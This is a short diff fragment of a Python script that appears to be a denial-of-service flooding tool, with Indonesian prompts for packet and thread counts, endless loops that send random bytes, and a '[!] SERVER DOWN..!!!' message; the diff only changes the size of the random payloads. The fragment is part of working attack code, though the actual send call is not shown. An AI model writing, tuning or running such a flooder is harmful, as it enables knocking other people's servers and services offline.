@@ -23,7 +23,7 @@ choice = str(input(" Gaskan Ga?(y/n):"))
 times = int(input(" Packets:"))
 threads = int(input(" Threads:"))
 def run():
-data = random._urandom(1180)
+data = random._urandom(1000)
 i = random.choice(("[PERMISI PAKETT]","[PERMISI PAKET]","[PERMISI PAKET]"))
 while True:
 try:
@@ -36,7 +36,7 @@ except:
 print("[!] SERVER DOWN..!!!")
 
 def run2():
-data = random._urandom(1475)
+data = random._urandom(16)
 i = random.choice(("[PERMIS PAKET]","[PERMISI PAKET]","[PERMISI PAKET]"))
 while True:
 try:
